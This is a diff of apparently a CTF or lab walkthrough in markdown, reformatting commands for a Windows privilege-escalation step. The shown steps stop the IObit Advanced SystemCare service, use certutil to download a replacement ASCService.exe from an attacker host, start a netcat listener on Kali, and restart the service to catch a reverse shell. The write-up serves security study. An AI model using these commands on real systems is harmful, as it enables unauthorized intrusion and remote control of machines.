@@ -96,18 +96,18 @@ I couldn't delete the ASCService.exe but I could replace it when I copied the fi
 
 **Victim**&#x20;
 
-cd C:\Program Files (x86)\IObit\Advanced SystemCare\
-sc stop AdvancedSystemCareService9&#x20;
+`cd C:\Program Files (x86)\IObit\Advanced SystemCare`\
+`sc stop AdvancedSystemCareService9`&#x20;
 
-certutil -urlcache -f http://10.10.228.214:81/ASCService.exe ASCService.exe
+`certutil -urlcache -f http://10.10.228.214:81/ASCService.exe ASCService.exe`
 
 **Kali**
 
-nc -lvnp 4443
+`nc -lvnp 4443`
 
 **Victim**
 
-sc start AdvancedSystemCareService9
+`sc start AdvancedSystemCareService9`
 
 ![](<../../.gitbook/assets/image (3).png>)
 
